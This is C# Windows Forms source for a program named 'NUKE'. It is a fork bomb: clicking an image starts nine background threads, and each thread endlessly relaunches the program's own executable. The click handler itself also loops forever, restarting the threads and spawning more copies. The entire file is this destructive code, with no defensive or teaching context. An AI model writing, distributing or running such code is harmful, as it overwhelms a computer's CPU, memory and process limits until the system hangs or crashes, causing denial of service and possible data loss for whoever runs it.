using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Windows.Forms;

namespace NUKE
{
    public partial class NUKE : Form
    {
        public NUKE()
        {
            InitializeComponent();
        }

        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker9_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker6_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker7_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }

        private void backgroundWorker8_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                Process.Start(Application.ExecutablePath);
            }
        }
        private void pictureBox1_Click(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
            backgroundWorker2.RunWorkerAsync();
            backgroundWorker3.RunWorkerAsync();
            backgroundWorker4.RunWorkerAsync();
            backgroundWorker5.RunWorkerAsync();
            backgroundWorker6.RunWorkerAsync();
            backgroundWorker7.RunWorkerAsync();
            backgroundWorker8.RunWorkerAsync();
            backgroundWorker9.RunWorkerAsync();
            while (true)
            {
                if (!backgroundWorker1.IsBusy) { backgroundWorker1.RunWorkerAsync(); }
                if (!backgroundWorker2.IsBusy) { backgroundWorker2.RunWorkerAsync(); }
                if (!backgroundWorker3.IsBusy) { backgroundWorker3.RunWorkerAsync(); }
                if (!backgroundWorker4.IsBusy) { backgroundWorker4.RunWorkerAsync(); }
                if (!backgroundWorker5.IsBusy) { backgroundWorker5.RunWorkerAsync(); }
                if (!backgroundWorker6.IsBusy) { backgroundWorker6.RunWorkerAsync(); }
                if (!backgroundWorker7.IsBusy) { backgroundWorker7.RunWorkerAsync(); }
                if (!backgroundWorker8.IsBusy) { backgroundWorker8.RunWorkerAsync(); }
                if (!backgroundWorker9.IsBusy) { backgroundWorker9.RunWorkerAsync(); }
                Process.Start(Application.ExecutablePath);
            }
        }

        private void NUKE_Load(object sender, EventArgs e)
        {
            backgroundWorker10.RunWorkerAsync();
        }
    }
}
